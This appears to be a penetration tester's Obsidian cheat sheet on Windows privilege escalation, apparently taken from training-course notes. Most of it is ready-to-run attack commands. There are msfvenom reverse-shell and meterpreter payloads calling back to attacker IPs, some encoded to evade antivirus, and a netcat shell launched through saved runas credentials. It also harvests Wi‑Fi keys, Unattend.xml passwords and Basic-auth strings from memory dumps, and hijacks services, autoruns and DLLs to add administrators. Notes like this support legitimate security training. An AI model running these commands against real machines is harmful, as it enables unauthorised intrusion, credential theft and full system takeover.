
#MSFvenom :
- Create payloads (adjust as needed)
	- `msfvenom -p windows/shell_reverse_tcp LHOST=<tun0> LPORT=1337 -f aspx > manual.aspx`

### Windows Privilege Escalation [Checklist](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)

- [Basic Enumeration](obsidian://open?vault=Main-Notes&file=%F0%9F%A6%8ATCM%20Security%2FPrivEsc_Windows%2F1_Initial_Enumeration):
    - `whoami /priv`
    - `systeminfo`
    - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- Windows Enumeration Scripts:
	- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) .exe
	- [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) .py
    - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) .ps1
	    - `powershell -ep bypass`
	    - ` . .\PowerUp.ps1`
	    - `Invoke-AllChecks`
- [LOLBINS](https://lolbas-project.github.io/) 
- #TokenImpersonation :
	- `whoami /priv`
    - `GodPotato.exe -cmd "cmd.exe /c whoami"`
    - Use Other [Potato Attacks](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato) for older systems
- Stored Passwords:
	- `findstr /si password *.txt *.ini *.config` 
		- _Note: runs in current directory_
	- `netsh wlan show profile`
	- `netsh wlan show profile <SSID> key=clear`
- AV Enumeration
	- `sc query windefend`
		- `sc queryex type= service`
	- `netsh advfirewall firewall dump`
		- `netsh firewall show state`
		- `netsh firewall show config`
- [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master), examples:
	- KiTrap0D – _CVE-2010-0232_ – LPE
	- Chimichurri – _CVE-2010-3338_ – LPE
	- PrintNightmare – _CVE-2021-34527_ – LPE/RCE
	- EternalBlue – _CVE-2017-0144_ – RCE (SMBv1 exploit used in WannaCry)
	- SMBGhost (CoronaBlue) – _CVE-2020-0796_ – RCE (SMBv3)
	- PrintNightmare – _CVE-2021-34527_ – LPE/RCE
	- etc.
- #WSL :
	- Find `wsl.exe` and `bash.exe` using `where /R c:\windows wsl.exe` and `where /R c:\windows bash.exe`
	- It runs as root, so
		- `c:\Windows\Path\To\wsl.exe whoami`
		- `c:\Windows\Path\To\bash.exe`
- #RunAs :
	- `cmdkey /list`
	- `runas /env /noprofile /savecred /user:username\administrator "cmd.exe /c whoami > whoami.txt"`
	- `runas /env /noprofile /savecred /user:username\administrator "c:\temp\nc.exe <IP> 443 -e cmd.exe"`
		- *We can use `mdb-sql` and `readpst` tools to open and read `.mdb` and `.pst` files*
- Writable Services: `sc qc <service>`
- #Autoruns :
	- Check if vulnerable with #PowerUp or:
		- `reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"`
		- `icacls "C:\Program Files (x86)\Startup Program\StartupProgram.exe"`
		- `.\accesschk64.exe -wvu "C:\Program Files\Autorun Program\program.exe" -accepteula`
	- Create payload with #MSFvenom 
		- `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o program.exe`
	- Replace payload and the Autorun file identified from above commands.
	- Run payload with listener, profit
- #AlwaysInstallElevated :
	- `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
	- `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
	- If `0x1`, then vulnerable. #PowerUp would also show this
	- `msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi`
- #regsvc :
	- `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
		- To privesc, output should show `NT AUTHORITY\INTERACTIVE`” has “`FullContol`
	- Create payload and compile
	- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
- #ExecutableFiles :
	- `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`
	- Notice that the “Everyone” user group has “`FILE_ALL_ACCESS`” permission
	- Create payload and compile
	- `sc start <exploit>`
- #StartUp :
	- `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
	- From the output notice that the “`BUILTIN\Users`” group has full access ‘(F)’ to the directory
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe`
	- Place `x.exe` in “`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`"
	- Restart/relogin
- #DLLHijacking :
	- Identify in #procmon 
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil-meterpreter64.dll`
	- `sc start <exploit>`
		- may need to stop and start
- #BinaryPaths :
	- `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *`
	- `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc`
		- Based on first result, we run it for `daclsvc`
		- We can also see this in `PowerUp.ps1` results
	- Notice that the output suggests that the user “`User-PC\User`” has the “`SERVICE_CHANGE_CONFIG`” permission
	- `sc qc daclsvc`
	- `sc config daclsvc binpath= "net localgroup administrators user /add"`
	- `sc start daclsvc`
- #UnquotedServicePaths :
	- `sc qc unquotedsvc`
	- Notice that the “`BINARY_PATH_NAME`” field displays a path that is not confined between quotes
	- `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
	- `msfvenom -p windows/shell/reverse_tcp LHOST=10.2.1.119 -f exe -o common.exe`
	- Place `common.exe` in ‘`C:\Program Files\Unquoted Path Service`'
	- Open command prompt and type: `sc start unquotedsvc`
- #ConfigFiles :
	-  `notepad C:\Windows\Panther\Unattend.xml`
	- Scroll down to the “`<Password>`” property and copy the base64 string that is confined between the “`<Value>`” tags underneath it
	- Use [CyberChef](https://cyberchef.org/), [Base64Decode](https://www.base64decode.org/), or Kali `base64` command
		- `echo [copied base64] | base64 -d`
- #Memory :
	- In Windows Task Manager, right-click on the “`iexplore.exe`” in the “Image Name” column and select “Create Dump File” from the popup menu.
	- `strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"`
	- `echo -ne [Base64 String] | base64 -d`  

```c
==ENUMERATE AGAIN AFTER PRIV ESC!==
```

